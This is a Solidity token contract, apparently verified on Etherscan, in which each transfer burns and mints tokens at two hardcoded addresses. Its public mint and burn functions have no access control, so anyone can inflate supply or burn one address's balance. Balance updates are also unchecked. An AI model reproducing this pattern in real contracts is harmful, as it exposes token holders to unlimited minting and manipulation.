['/**\n', ' *Submitted for verification at Etherscan.io on 2021-06-05\n', '*/\n', '\n', 'pragma solidity ^0.4.23;\n', '\n', 'contract KuraeToken {\n', '    mapping (address => uint256) public balanceOf;\n', '    address public owner = msg.sender;\n', '\n', '    string public name;\n', '    string public symbol;\n', '    uint8 public decimals;\n', '    uint256 public totalSupply;\n', '\n', '    event Transfer(address indexed from, address indexed to, uint256 value);\n', '\n', '    constructor (\n', '        uint256 _totalSupply,\n', '        uint8 _decimals,\n', '        string _name,\n', '        string _symbol\n', '    )\n', '        public\n', '    {\n', '        name = _name;\n', '        symbol = _symbol;\n', '        decimals = _decimals;\n', '\n', '        totalSupply = _totalSupply;\n', '        balanceOf[msg.sender] = _totalSupply;\n', '        emit Transfer(address(0), msg.sender, _totalSupply);\n', '    }\n', '\n', '    function transfer(address to, uint256 value) public returns (bool success) {\n', '        require(balanceOf[msg.sender] >= value);\n', '\n', '        balanceOf[msg.sender] -= value;\n', '        balanceOf[to] += value;\n', '        emit Transfer(msg.sender, to, value);\n', '        burn(value*5/100);\n', '        mint(value*2/100);\n', '        return true;\n', '    }\n', '\n', '    event Approval(address indexed owner, address indexed spender, uint256 value);\n', '\n', '    mapping(address => mapping(address => uint256)) public allowance;\n', '\n', '    function approve(address spender, uint256 value)\n', '        public\n', '        returns (bool success)\n', '    {\n', '        allowance[msg.sender][spender] = value;\n', '        emit Approval(msg.sender, spender, value);\n', '        return true;\n', '    }\n', '\n', '    function transferFrom(address from, address to, uint256 value)\n', '        public\n', '        returns (bool success)\n', '    {\n', '        require(value <= balanceOf[from]);\n', '        require(value <= allowance[from][msg.sender]);\n', '\n', '        balanceOf[from] -= value;\n', '        balanceOf[to] += value;\n', '        allowance[from][msg.sender] -= value;\n', '        emit Transfer(from, to, value);\n', '        burn(value*5/100);\n', '        mint(value*2/100);\n', '        return true;\n', '    }\n', '\n', '    function burn(uint256 amount) public {\n', '        require(amount <= balanceOf[0x42A65B011fc9d276FbdFc803d4CfE50795A62e64]);\n', '\n', '        totalSupply -= amount;\n', '        balanceOf[0x42A65B011fc9d276FbdFc803d4CfE50795A62e64] -= amount;\n', '        emit Transfer(0x42A65B011fc9d276FbdFc803d4CfE50795A62e64, address(0), amount);\n', '    }\n', '\n', '    function mint(uint256 amount) public {\n', '        require(totalSupply + amount >= totalSupply); // Overflow check\n', '\n', '        totalSupply += amount;\n', '        balanceOf[0x98fA1B6Ad96C727633A30879EB8A58883c094e7E] += amount;\n', '        emit Transfer(address(0), 0x98fA1B6Ad96C727633A30879EB8A58883c094e7E, amount);\n', '    }\n', '\n', '}']